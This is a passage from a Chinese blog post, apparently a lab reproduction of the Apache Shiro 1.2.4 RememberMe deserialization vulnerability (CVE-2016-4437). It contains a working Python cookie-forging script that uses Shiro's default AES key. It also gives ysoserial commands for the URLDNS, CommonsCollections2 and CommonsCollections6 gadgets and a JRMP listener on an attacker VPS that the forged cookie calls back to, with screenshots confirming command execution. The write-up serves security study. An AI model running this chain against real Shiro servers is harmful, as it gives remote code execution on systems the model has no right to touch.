<span class="token comment"># cookie = &quot;Cug6rRUP6+Nxy/zupy8zen+Npa0r/TCD5Cy40XjwlKsVUp91QqDOrGnt7KNbkUZPCG8+s780xNbX3qsy92Kjwv9RoDpZlrnbE7yBAL70bl5q0nShc/CmJeNbP/9ybToxM1cvY4UCpaLKwdourjzxCr6EvjFjtuAunpsRBBThSjIPKS6qyZj08ZY95LDA0WdSnRrDx/rCw12YgskcUIlstpPc7MPLRVjSWJ1ghIg7lXXVDLt0GeoGhsYp0kX2aANjOi3bfFv73Wuj49f5OxnLE3LrMskRI+GsynCjmZJLKb88Sjz7nByIMhZwvoCc6fmEZQyjOgnJFGlps3T+FfLkTcyoE1kvCNFfGnBLlX7TVbjo0ySB7k+6vYaQHny2yv1gZ8DyUq3+wbiIleI/RjDoHP07yiCRJHWT23/4AoYSyQAMAauW2E6Fw2/Mu+Ac3/qWLZ7LNOetqargbLwBbKc3uJJoG9Kb4KwjRjj7jmKh4GIIcRk5CujpBaiOKHfOIM/S&quot;</span>
<span class="token keyword">print</span> encryptor<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325102536.png" alt="image-20210325102536864"></p> <h4 id="cookie伪造"><a href="#cookie伪造" class="header-anchor">#</a> Cookie伪造</h4> <p>同理，在Cookie伪造的时候使用随机十六位IV就可以：</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token comment"># python2</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> uuid
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES

key <span class="token operator">=</span> <span class="token string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>
mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC
IV <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span>
encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> IV<span class="token punctuation">)</span>

payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size
pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> pad<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>IV <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><h2 id="测试gadget"><a href="#测试gadget" class="header-anchor">#</a> 测试Gadget</h2> <h3 id="urldns"><a href="#urldns" class="header-anchor">#</a> URLDNS</h3> <p>URLDNS这条Gadget不需要其他依赖支持，一般用来测试target是否存在反序列化漏洞。</p> <p>使用ysoserial生成序列化数据：</p> <div class="language-bash extra-class"><pre class="language-bash"><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS <span class="token string">&quot;http://b8ftn5.dnslog.cn&quot;</span> <span class="token operator">|</span>base64 <span class="token operator">|</span><span class="token function">sed</span> <span class="token string">':label;N;s/<span class="token entity" title="\n">\n</span>//;b label'</span>
</code></pre></div><p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325112120.png" alt="image-20210325112112935"></p> <p>再使用Cookie伪造脚本进行伪造：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325112215.png" alt="image-20210325112215534"></p> <p>然后发送Cookie：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325112304.png" alt="image-20210325112304118"></p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325112324.png" alt="image-20210325112324441"></p> <p>收到了DNS查询请求，URLDNS Gadget验证成功，确实存在Java反序列化漏洞。</p> <h3 id="cc2"><a href="#cc2" class="header-anchor">#</a> CC2</h3> <p>为了方便复现，之前本地添加了<code>commons-collections4</code>的依赖，而CC2这条Gadget完全依赖于<code>commons-collections4</code>，所以可以用CC2生成payload来测试，本地环境如下：</p> <ul><li>JDK 8u281</li> <li>Tomcat 9.0.44</li></ul> <p>生成序列化数据：</p> <div class="language-bash extra-class"><pre class="language-bash"><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 <span class="token string">&quot;calc&quot;</span> <span class="token operator">|</span>base64 <span class="token operator">|</span><span class="token function">sed</span> <span class="token string">':label;N;s/<span class="token entity" title="\n">\n</span>//;b label'</span>
</code></pre></div><p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325124659.png" alt="image-20210325124659250"></p> <p>伪造Cookie：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325124718.png" alt="image-20210325124718251"></p> <p>发送请求：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325124903.gif" alt="1"></p> <h3 id="jrmp"><a href="#jrmp" class="header-anchor">#</a> JRMP</h3> <p>使用<code>mvn dependency:list</code>命令可以查看Shiro中的依赖项，可以发现有<code>commons-collections 3.2.1</code>的依赖：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325145735.png" alt="image-20210325145735900"></p> <p>但是尝试直接用ysoserial中的CC6这条Gadget生成的payload直接打的话并不能成功，而是会产生以下错误：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325145703.png" alt="image-20210325145703717"></p> <p><s>参考<a href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html" target="_blank" rel="noopener noreferrer">Go low – Exploiting JVM deserialization vulns despite a broken class loader (kapsi.fi)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>可知Shiro使用的ClassLoader不允许加载任何数组类型的对象，但是ysoserial中大多数的Gadget都依赖于下面两个类：</s></p> <ul><li><p><s>ChainedTransformer：内部有一个数组类型的对象<code>iTransformers</code>，用于进行链式调用。</s></p></li> <li><p><s>InvokerTransformer：内部传递给待调用的方法的参数是一个数组，但是如果方法的参数为空，则不影响使用。</s></p></li></ul> <p><strong>【已更新！】：真实原因并不是如上所述那么简单，详细原因见下面两篇文章：</strong></p> <ul><li><a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener noreferrer">强网杯“彩蛋”——Shiro 1.2.4(SHIRO-550)漏洞之发散性思考 - zsx's Blog (zsxsoft.com)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/" target="_blank" rel="noopener noreferrer">Shiro 1.2.4 RememberMe反序列化漏洞踩坑分析(CVE-2016-4437) | Rai4over's Blog<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul> <p>简言之，是因为Tomcat类加载（classpath）的问题，导致了无法加载除Java本身自带的数组。</p> <p>解决这个问题的方法是使用JRMP，在VPS上执行下面的命令，监听端口，这里先用CC2 Gadget来测试：</p> <div class="language-bash extra-class"><pre class="language-bash"><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener <span class="token number">12345</span> CommonsCollections2 <span class="token string">'calc'</span>
</code></pre></div><p>使用ysoserial生成序列化数据，并伪造Cookie：</p> <div class="language-bash extra-class"><pre class="language-bash"><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient <span class="token string">&quot;{VPS_IP}:12345&quot;</span><span class="token operator">|</span>base64 <span class="token operator">|</span><span class="token function">sed</span> <span class="token string">':label;N;s/<span class="token entity" title="\n">\n</span>//;b label'</span>
···
py -2 AES-en.py <span class="token punctuation">{</span><span class="token variable">$ser_data</span><span class="token punctuation">}</span>
</code></pre></div><p>本地使用JDK8u281测试JRMP失败，于是我换成了JDK1.7，同时由于Tomcat9不支持Java7，所以更换为Tomcat8：</p> <ul><li>JDK 1.7</li> <li>Tomcat 8.5.64</li></ul> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325163717.png" alt="image-20210325163717040"></p> <p>发送含有伪造的Cookie的请求，测试成功：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325163905.png" alt="image-20210325163905782"></p> <p>因为我们之前手动添加了<code>commons-collections4</code>的依赖，所以这里使用CC2 Gadget可以成功执行命令，但是如果换成CC6 Gadget，虽然我们之前提到Shiro中含有<code>commons-collections 3.2.1</code>的依赖，但是本地测试并没有成功执行命令：</p> <div class="language-bash extra-class"><pre class="language-bash"><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener <span class="token number">12345</span> CommonsCollections6 <span class="token string">&quot;calc&quot;</span>
</code></pre></div><p>参考李三师傅的文章[shiro 反序列化复现 - 李三的剑谱](http://redteam.today/2019/09/20/shiro 反序列化复现/)可以知道，Shiro中的<code>commons-collections 3.2.1</code>依赖为<code>test</code>，而打包成<code>war</code>包的时候只会把<code>compile</code>和<code>runtime</code>的依赖打包，而<code>test</code>的依赖是在开发阶段使用的，也就是说实际运行环境中并没有<code>commons-collections 3.2.1</code>的依赖，原文如下：</p> <blockquote><p>然而本地测试的时候并未复现中，应该是gadget的问题，因为在加了commons-conllections4.0的环境用ysoserial的CommonsCollections2就可以成功。难道是环境没装好？</p> <p><strong>后来仔细看了一下，确实是环境的问题，具体原因是打包成war的时候只会把compile和runtime的打包，而test的属于开发阶段需要使用的，从而不会打进去，而这里common-conllectons恰好属于test。所以生成环境中根本没有common-conllectons，因此是不可能打成功的</strong>。</p></blockquote> <p>所以我们手动添加<code>commons-collections 3.2.1</code>的依赖，让其为<code>compile</code>：</p> <div class="language-xml extra-class"><pre class="language-xml"><code>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.2.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>然后再次测试：</p> <div class="language-bash extra-class"><pre class="language-bash"><code>mvn clean <span class="token function">install</span>
······
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient <span class="token string">&quot;{VPS_IP}:12345&quot;</span><span class="token operator">|</span>base64 <span class="token operator">|</span><span class="token function">sed</span> <span class="token string">':label;N;s/<span class="token entity" title="\n">\n</span>//;b label'</span>
py -2 AES-en.py <span class="token punctuation">{</span><span class="token variable">$ser_data</span><span class="token punctuation">}</span>
······
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener <span class="token number">12345</span> CommonsCollections6 <span class="token string">&quot;calc&quot;</span>
</code></pre></div><p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325170753.gif" alt="1"></p> <p>再手动添加了<code>commons-collections 3.2.1</code>依赖之后，这次测试成功了。</p> <blockquote><p>正如李三师傅所说：</p> <p><strong>纯原生的shiro只是一个反序列化的触发点，没有完整gadget。因此需要结合其它依赖shiro的项目才有可能达到RCE的效果（比如jeecms）</strong></p></blockquote> <h2 id="reference"><a href="#reference" class="header-anchor">#</a> Reference</h2> <p>感谢几位师傅详尽的分析文章，让我这个菜鸡少踩了一些坑：</p> <p>笑师傅：<a href="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8" target="_blank" rel="noopener noreferrer">Shiro 1.2.4 反序列化漏洞 | l3yx's blog<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>李三师傅：[shiro 反序列化复现 - 李三的剑谱](http://redteam.today/2019/09/20/shiro 反序列化复现/)</p> <p><a href="https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html#directory0592593546308368510" target="_blank" rel="noopener noreferrer">Apache Shiro Java反序列化漏洞分析 - 贫民窟的艺术家 (joychou.org)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><a href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html" target="_blank" rel="noopener noreferrer">Go low – Exploiting JVM deserialization vulns despite a broken class loader (kapsi.fi)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><a href="https://www.jianshu.com/p/45848dd484a9" target="_blank" rel="noopener noreferrer">关于AES加解密中CBC模式的IV初始化向量的安全性问题 - 简书 (jianshu.com)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>https://issues.apache.org/jira/browse/SHIRO-550</p></div></div> <div class="page-slot page-slot-bottom"><!-- 横向自适应 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6620245489"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="page-edit"><!----> <!----> <!----></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/c398ec/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">Shiro权限绕过4</div></a> <a href="/pages/ca9de1/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">利用TemplatesImpl改造CC6攻击Shiro</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/c398ec/" class="prev">Shiro权限绕过4</a></span> <span class="next"><a href="/pages/ca9de1/">利用TemplatesImpl改造CC6攻击Shiro</a>→
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/ecfe38/"><div>在Shiro中使用无CommonsCollections依赖的CommonsBeanUtils利用链</div></a> <span>04-19</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/369a02/"><div>CommonsBeanUtils</div></a> <span>04-19</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/c962a4/"><div>基于Tomcat全局存储进行回显</div></a> <span>04-16</span></dt></dl> <dl><dd></dd> <dt><a href="/archives" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:452584023@qq.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/F4ded" title="GitHub" target="_blank" class="iconfont icon-github"></a><a href="https://music.163.com/#/playlist?id=6725342618&amp;userid=269389449" title="来听音乐吧" target="_blank" class="iconfont icon-yinle2"></a><a href="https://f4de.ink" title="原博客" target="_blank" class="iconfont icon-bianji"></a><a href="https://f4de-bak.github.io/sitemap.xml" title="RSS订阅" target="_blank" class="iconfont icon-rss1"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2020-2021
    <span></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">跟随系统</li><li class="iconfont icon-rijianmoshi">浅色模式</li><li class="iconfont icon-yejianmoshi">深色模式</li><li class="iconfont icon-yuedu">阅读模式</li></ul></div></div> <!----> <!----> <div class="custom-html-window custom-html-window-rb" style="display:;"><div class="custom-wrapper"><i class="close-but">×</i> <div><!-- 固定160*160px -->
      <ins class="adsbygoogle"
          style="display:inline-block;max-width:160px;max-height:160px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="8377369658"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script>
      </div></div></div></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.65b722b4.js" defer></script><script src="/assets/js/2.977200c2.js" defer></script><script src="/assets/js/16.81740bbb.js" defer></script>
  </body>
</html>